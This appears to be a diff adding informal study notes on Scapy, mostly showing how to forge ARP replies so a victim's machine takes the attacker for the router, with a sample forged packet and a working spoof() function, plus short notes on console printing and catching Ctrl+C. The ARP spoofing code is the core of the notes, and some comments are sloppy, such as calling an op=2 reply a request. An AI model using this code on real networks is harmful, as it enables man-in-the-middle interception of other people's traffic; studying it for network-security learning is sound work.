@@ -1,0 +1,31 @@
+scapy : 
+
+scapy.ls(scapy.ARP)
+
+to create one packet : 
+
+#to create arp requet , op  == 2
+#pdst = ip of target 
+#hwdst = mac of target 
+#forging to victim to believe that this request is from router but not from attacker.
+# packet = scapy.ARP(op=2 ,pdst="192.168.1.11" ,hwdst="64:5a:04:0c:64:5e", psrc="192.168.1.1" )
+# ARP is at 28:cd:c4:f4:de:b9 says 192.168.1.1 attacker mac have router's ip
+# sending this packet means , target machine will think that attacker machine is router
+
+def spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet,verbose=False)
+
+
+for dynamic printing : 
+import sys
+
+print(\r), - always print at start of line
+sys.stdout.flush()
+
+
+when ctrl+c entered during execution of program
+try and exectption
+except KeyboardInterrupt:
+    print("Detected ctrlc and quitting....")
